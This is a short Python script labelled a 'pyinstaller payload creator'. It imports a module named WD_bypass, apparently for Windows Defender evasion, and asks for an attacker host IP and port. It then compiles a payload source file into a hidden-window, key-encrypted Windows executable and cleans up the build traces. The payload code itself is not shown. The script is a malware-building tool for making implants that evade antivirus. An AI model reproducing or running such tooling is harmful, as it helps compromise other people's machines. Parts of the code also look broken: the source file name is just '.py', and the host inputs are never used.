import os, subprocess, socket
import WD_bypass

VERSION = "develop1.0 by jeho"
LINE_LENGTH = 50

#SRC_FILE_NAME = "wqr_payload.py"
SRC_FILE_NAME = ".py"
DEST_FILE_NAME = "wqr_payload"

def print_bar(end):
    for i in range(0,end):
        print('-',end='')
        if(i==end-1):
            print()

def sp_indir(cmd):
    print(f"exec : {cmd}")
    subprocess.call(f"{cmd}",cwd=os.path.dirname(os.path.abspath(__file__)),shell=True)

print_bar(LINE_LENGTH)
print("pyinstaller payload creator")
print(f"required : {SRC_FILE_NAME} in same directory...")

host_ip_addr = input("host ip address : ")
host_port = input("host port num : ")

file_name = f"{DEST_FILE_NAME}{host_port}"
cmd_pyinstaller =f"pyinstaller -F -w --clean --key 123456789123456789 --icon=NONE {SRC_FILE_NAME} --name {file_name}.exe"
cmd_rm_build = "rmdir /s /q build"
cmd_mv_exe = f"cd dist&&move {file_name}.exe .."
cmd_cd_before ="cd .."
cmd_rm_dist = "rmdir /s /q dist"
cmd_rm_spec = f"del {file_name}.exe.spec"

sp_indir(f"{cmd_pyinstaller}&&{cmd_mv_exe}&&{cmd_cd_before}&&{cmd_rm_dist}&&{cmd_rm_spec}")
sp_indir(f"{cmd_rm_build}")

print_bar(LINE_LENGTH)
print("exe generate success!")
os.system('pause')